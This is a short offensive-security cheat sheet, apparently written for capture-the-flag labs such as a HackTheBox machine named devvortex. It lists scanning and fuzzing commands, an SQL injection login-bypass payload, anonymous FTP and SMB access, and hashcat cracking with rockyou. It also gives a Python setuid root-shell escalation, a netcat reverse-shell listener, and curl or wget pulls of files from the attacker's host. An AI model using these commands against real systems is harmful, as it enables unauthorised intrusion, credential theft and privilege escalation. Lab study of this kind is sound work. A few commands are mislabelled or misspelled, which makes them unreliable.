

# ENUMERATION

## Basic NMAP Scan (Run on KALI)
nmap -sC -sV

## Add Host to Hosts File (Run on KALI)
echo "[IP] [hostname]" | sudo tee -a /etc/hosts

## Basic Web Directory Scan (Run on KALI)
gobuster dir --url http://[TARGET_IP]/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://dev.devvortex.htb/FFUZ -ic -t 100 -mc 301

## Basic FFuF Web Enumeration Scan (Run on KALI)
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fw 4 -t 100

# FOOTHOLD

## SQL Injection
admin' or 1 = 1 -- -

## FTP Anonymous Access (Run on KALI) (Linux or Windows)
ftp [IP] -> anonymous:anonymous

## SMB Client (Run on KALI) (Linux or Windows)
smbclient -N -L \\\\[TARGET_IP]\\
-N : No password
-L : This option allows you to look at what services are available on a server

# ON-SITE RECON

## WINPEAS

## LINPEAS

## Hashcat (Run on KALI)
hashid '[hash]' -> Yields the mode for hashcat, save hash as file
hashcat -m [mode] [file] /usr/share/wordlists/rockyou.txt

# PRIVILEGE ELEVATION

## For Vulnerable Python (Run on TARGET)
/usr/bin/python[version]
import os
os.setuid(0)
os.system("/bin/bash")

## Reverse Shell (Run on KALI)
nc -lvnp 1234

## HTTP Server (Run on KALI)
sudo python3 -m http.server 80

## File Pull from HTTP Server (Run on TARGET)
curl http://[KALI IP]/[filename] -o [filename] (Linux)
wget http://[KALI IP]/[filename] (Windows)

## Make Script File Executable (Run on TARGET) (Linux)
chmod +x [filename]

# Exploitation

## Write file to console (Windows)
filename [filename]

## Write file to console (Linux)
cat [fileneame]

## Search Files for String (Linux)
cat * | grep -i [string]*
